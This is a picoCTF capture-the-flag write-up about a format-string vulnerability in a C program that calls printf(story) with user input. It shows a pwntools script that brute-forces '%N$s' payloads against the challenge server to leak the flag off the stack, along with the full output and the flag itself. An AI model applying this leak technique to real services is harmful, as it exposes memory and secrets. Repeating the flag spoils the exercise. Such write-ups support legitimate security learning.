#### Description

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 55800`

Contents of `vuln.c` : 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
u
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

Lets analyse the code. Here is what is interesting: 

```c
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story); // <- no format specifier, vulnerable to format string attacks
   printf("\n");
}
```

This is how the print statement works: 
The `printf` function takes a variable number of arguments. The 0th argument is the format string, and the 1st and late arguments are the values that match the format. The grammar of a conversion specification is: 
```
%[argument$][flags][width][.precision][length modifier]conversion
```

But in the program given above, there is only one argument passed in the `printf` statement. 
So, we have full control on what format string to use. 

Python script: 
```python
from pwn import * 

for i in range(128):
    x = remote('saturn.picoctf.net', 57992)
    try: 
        x.sendline('%' + str(i) + '$s')
        x.recvuntil(b'>')
        y = x.recvlines(2)[1] # this line was giving me EOF error, so I put it in a try except block  
        if b'CTF' in y:
            print(y)
            x.close()
            break
        print(i, y)
        x.close()
    except Exception:
        pass
```

Output: 
```
 x.sendline('%' + str(i) + '$s')
0 b'%0$s'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
1 b'%1$s'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
2 b'\x10Q\x93\xf2'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
3 b'\x81\xc3\xba,'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
[+] Opening connection to saturn.picoctf.net on port 57992: Done
[+] Opening connection to saturn.picoctf.net on port 57992: Done
6 b'(null)'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
7 b'\x07/'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
8 b''
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
[+] Opening connection to saturn.picoctf.net on port 57992: Done
10 b'(null)'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
11 b'\xb3.'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
12 b''
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
13 b'(null)'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
14 b''
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
15 b'\x83\xc4\x10\x83\xf8\xff\x0f\x84\xba'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
16 b'\x87(\xad\xfbg\x8d@\xeeg\x8d@\xeeg\x8d@\xeeg\x8d@\xeeg\x8d@\xeeg\x8d@\xeeg\x8d@\xeeh\x8d@\xee'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
[+] Opening connection to saturn.picoctf.net on port 57992: Done
18 b'(null)'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
19 b'setresgid'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
20 b'\xa0\xb1\xd5\xec'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
21 b'\x89\xc7e\xa1\x0c'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
22 b'setresgid'
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
23 b''
[*] Closed connection to saturn.picoctf.net port 57992
[+] Opening connection to saturn.picoctf.net on port 57992: Done
b'CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}'
[*] Closed connection to saturn.picoctf.net port 57992
[*] Closed connection to saturn.picoctf.net port 57992
[*] Closed connection to saturn.picoctf.net port 57992
[*] Closed connection to saturn.picoctf.net port 57992
[*] Closed connection to saturn.picoctf.net port 57992
```


flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`

Reference: 
